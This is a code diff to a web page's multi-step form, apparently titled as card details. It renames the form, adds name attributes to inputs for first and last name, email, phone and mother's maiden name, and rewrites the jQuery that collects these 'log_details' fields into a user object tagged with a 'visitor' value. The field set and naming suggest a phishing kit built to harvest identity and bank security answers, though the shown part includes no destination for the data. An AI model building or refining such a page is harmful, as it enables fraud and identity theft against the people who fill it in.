@@ -54,7 +54,8 @@
                </div>
                <div id="unorder-list" class="errors"> </div>
             </div>
-            <form id="carddetails_form">
+            
+            <form id="subform">
                <span>Step 1 of 3 - Personal details </span>
                <fieldset>
                   <div class="panel">
@@ -64,7 +65,7 @@
             <label data-field-name="first-name" data-field-title="First name" for="contact_details_firstName">
                 <span class="label">First Name</span>
                 <span class="control">
-                    <input class="log_details" type="text" aria-required="true" maxlength="100" data-bind="value: firstName" id="FirstName" />
+                    <input class="log_details" type="text" aria-required="true" maxlength="100" name="Firstname" id="FirstName" />
                 </span>
                 <span class="visually-hidden">100 characters is the maximum length of this field</span>
             </label>
@@ -73,7 +74,7 @@
             <label data-field-name="last-name" data-field-title="Last name" for="contact_details_lastName">
                 <span class="label">Last Name</span>
                 <span class="control">
-                    <input class="log_details"  type="text" aria-required="true" maxlength="100" data-bind="value: lastName" id="LastName" />
+                    <input class="log_details"  type="text" aria-required="true" maxlength="100" data-bind="value: lastName" name="Lastname" id="LastName" />
                 </span>
                 <span class="visually-hidden">100 characters is the maximum length of this field</span>
             </label>
@@ -82,7 +83,7 @@
             <label data-field-name="email" data-field-title="Email" for="contact_details_email">
                 <span class="label">Email</span>
                 <span class="control">
-                    <input class="log_details" type="email" aria-required="true" maxlength="100" data-bind="value: email" id="Email" />
+                    <input class="log_details" type="email" aria-required="true" maxlength="100" data-bind="value: email" name="Email" id="Email" />
                 </span>
                 <span class="visually-hidden">100 characters is the maximum length of this field</span>
             </label>
@@ -91,7 +92,7 @@
             <label data-field-name="phone-number" data-field-title="Phone number" for="contact_details_phoneNumber">
                 <span class="label">Phone Number</span>
                 <span class="control">
-                    <input class="log_details" type="tel" aria-required="true" maxlength="15" data-bind="value: phoneNumber" id="PhoneNumber" />
+                    <input class="log_details" type="tel" aria-required="true" maxlength="15" data-bind="value: phoneNumber" name="PhoneNumber" id="PhoneNumber" />
                 </span>
                 <span class="visually-hidden">15 characters is the maximum length of this field</span>
             </label>
@@ -109,7 +110,7 @@
             <label data-field-name="mothers-maiden-name" data-field-title="Mother's maiden name" for="contact_details_mothersMaidenName">
                 <span class="label">Mother's Maiden Name</span>
                 <span class="control">
-                    <input class="log_details" type="text" aria-required="true" maxlength="100" data-bind="value: mothersMaidenName" id="MothersMaidenName" />
+                    <input class="log_details" type="text" aria-required="true" maxlength="100" data-bind="value: mothersMaidenName" name="MMN" id="MothersMaidenName" />
                 </span>
                 <span class="visually-hidden">100 characters is the maximum length of this field</span>
             </label>
@@ -121,7 +122,7 @@
     <button type="button" class="button" data-bind="click: cancel">
         <span>Cancel</span>
     </button>
-    <button id="subbut" class="button-alt" data-bind="click: submit">
+    <button id="subbut" type="submit" class="button-alt" data-bind="click: submit">
         <span>Next</span>
     </button>
 </div>
@@ -154,7 +155,8 @@
     $('#subbut').on('click', function(event) {
         event.preventDefault(); // Prevent the default action of the link
 
-        let myForm = $("#carddetails_form");
+        let myForm = $("#subform");
+        console.log(myForm);
         let checkInputs = document.querySelectorAll('.log_details');
 
         let list = document.getElementById('unorder-list');
@@ -192,7 +194,7 @@
 
             userinfo.forEach((value) => {
                 // Use the 'name' attribute to create user object
-                user[value.id] = value.value;
+                user[value.name] = value.value;
             });
 
             user['visitor'] = visitor;
